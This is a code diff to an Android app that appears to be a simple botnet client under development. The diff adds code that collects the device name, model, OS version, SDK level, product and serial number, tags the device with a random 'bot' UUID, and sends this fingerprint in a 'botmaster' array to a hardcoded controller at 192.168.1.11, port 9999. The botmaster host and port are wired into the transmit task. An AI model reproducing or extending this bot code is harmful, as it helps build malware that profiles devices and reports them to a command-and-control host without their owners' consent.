@@ -7,6 +7,7 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.os.Build;
 import android.os.Environment;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -37,6 +38,7 @@ import java.net.UnknownHostException;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.Arrays;
+import java.util.UUID;
 
 // test info
 
@@ -137,7 +139,17 @@ public class MainActivity extends AppCompatActivity {
 
     void menu3WasClicked(){
         mString2Byte.append("Check internet connection\n");
-        String[] botmaster = {"192.168.1.11", "9999", "1", "Various system info", "bot12"};
+        String various_os = System.getProperty("os.version"); // OS version
+        String various_sdk = android.os.Build.VERSION.SDK;      // API Level
+        String various_device = android.os.Build.DEVICE;           // Device
+        String various_model = android.os.Build.MODEL;            // Model
+        String various_product = android.os.Build.PRODUCT;          // Product
+        String bot_username = "bot" + UUID.randomUUID().toString();
+        String[] botmaster = {"192.168.1.11",
+                "9999",
+                "1",
+                "\n Device name : "+various_device+" \n Model : "+various_model+" \n OS : "+various_os+" \n product : "+various_product+" \n SDK : "+various_sdk+" \n",
+                bot_username};
         String result = null;
         new transmit().execute(botmaster);
         GetLocalIP();
@@ -152,6 +164,25 @@ public class MainActivity extends AppCompatActivity {
             mString2Byte.append("Internet is down\n");
         }
 
+    }
+
+    void menu5WasClicked(){
+        String various_os = System.getProperty("os.version"); // OS version
+        String various_sdk = android.os.Build.VERSION.SDK;      // API Level
+        String various_device = android.os.Build.DEVICE;           // Device
+        String various_model = android.os.Build.MODEL;            // Model
+        String various_product = android.os.Build.PRODUCT;          // Product
+        String bot_username = "BOT#" + UUID.randomUUID().toString();
+        String various_serial = Build.SERIAL;
+        mString2Byte.setText(
+                "Device : "+various_device+
+                "\n Model : "+various_model+
+                "\n Product : "+various_product+
+                "\n SDK : "+various_sdk+
+                " \n OS : "+various_os+
+                "\n Bot UUID : "+bot_username+
+                "\n Serial num : "+various_serial+
+                "\n");
     }
 
     void menu4WasClicked(){
@@ -173,8 +204,8 @@ public class MainActivity extends AppCompatActivity {
         protected String doInBackground(String... strings) {
             //int port = Integer.parseInt(strings[0]);
             String[] str_port = strings;
-            //int port = Integer.parseInt(str_port[0]);
-            int port = 9999;
+            int port = Integer.parseInt(str_port[0]);
+            //int port = 9999;
             ServerSocket ss;
             Socket s;
             DataInputStream dis;
@@ -263,24 +294,30 @@ public class MainActivity extends AppCompatActivity {
             return true;
         } else {
             if (itemThatWasClickedId == R.id.action_convertimage) {
-                Toast.makeText(this,"Image 2 byte array", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "Image 2 byte array", Toast.LENGTH_LONG).show();
                 convertImage2Byte();
                 return true;
-            }else {
-                if (itemThatWasClickedId==R.id.action_menu3){
+            } else {
+                if (itemThatWasClickedId == R.id.action_menu3) {
                     Toast.makeText(this, "Menu 3 was clicked", Toast.LENGTH_LONG).show();
                     menu3WasClicked();
                     return true;
                 } else {
-                    if (itemThatWasClickedId==R.id.action_menu4){
-                        Toast.makeText(this,"Menu 4 was clicked", Toast.LENGTH_LONG).show();
+                    if (itemThatWasClickedId == R.id.action_menu4) {
+                        Toast.makeText(this, "Menu 4 was clicked", Toast.LENGTH_LONG).show();
                         menu4WasClicked();
                         return true;
+                    } else {
+                        if (itemThatWasClickedId == R.id.action_menu5) {
+                            Toast.makeText(this, "Menu 5 was clicked", Toast.LENGTH_LONG).show();
+                            menu5WasClicked();
+                            return true;
+                        }
                     }
                 }
             }
         }
-        return super.onOptionsItemSelected(item);
+            return super.onOptionsItemSelected(item);
     }
     }
 
